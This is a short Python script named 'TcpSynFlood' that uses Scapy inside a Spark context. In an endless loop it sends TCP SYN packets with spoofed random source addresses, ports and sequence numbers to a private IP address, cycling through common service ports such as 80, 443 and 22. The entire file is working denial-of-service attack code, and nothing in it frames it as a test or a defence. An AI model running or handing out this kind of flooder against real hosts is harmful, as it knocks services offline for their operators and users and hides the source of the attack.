#!/bin/env python3
from pyspark import SparkContext
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

# Create a SparkContext (master node)
sc = SparkContext("spark://192.168.86.128:7077", "TcpSynFlood")

ports=[80, 443, 8443, 8080, 53, 22, 23, 25]
count=0

while True:

	ports_rdd = sc.parallelize(ports)
	
	ip = IP(dst="192.168.86.129")
	tcp = TCP(dport=ports[count], flags='S')
	pkt = ip/tcp
	
	count+=1
	if count==len(ports):
		count=0
	
	pkt[IP].src = str(IPv4Address(getrandbits(32)))
	pkt[TCP].sport = getrandbits(16)
	pkt[TCP].seq = getrandbits(32)
	send(pkt, verbose = 0)
	pkt.show()
	
sc.stop()